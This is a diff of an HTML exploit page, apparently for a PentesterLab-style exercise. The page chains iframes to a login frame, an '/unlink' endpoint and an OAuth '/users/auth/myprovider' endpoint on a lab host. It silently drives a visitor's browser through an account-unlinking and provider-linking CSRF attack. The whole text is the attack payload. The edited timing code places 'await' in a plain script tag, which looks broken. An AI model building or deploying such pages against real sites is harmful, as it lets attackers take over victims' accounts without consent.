@@ -2,13 +2,18 @@
 <html>
 <head>
 <title>Page Title</title>
+<script>
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+</script>
 </head>
 <body>
 
-<iframe src="http://gnogr.github.io/login_frame.html"></iframe>
-<script>sleep(2);</script>
+<iframe src="http://gnogr.github.io/login_frame"></iframe>
+<script>await sleep(2000);</script>
 <iframe src="http://ptl-50f91015-7087047a.libcurl.so/unlink"></iframe>
-<script>sleep(2);</script>
+<script>await sleep(2000);</script>
 <iframe src="http://ptl-50f91015-7087047a.libcurl.so/users/auth/myprovider"></iframe>
 
 </body>
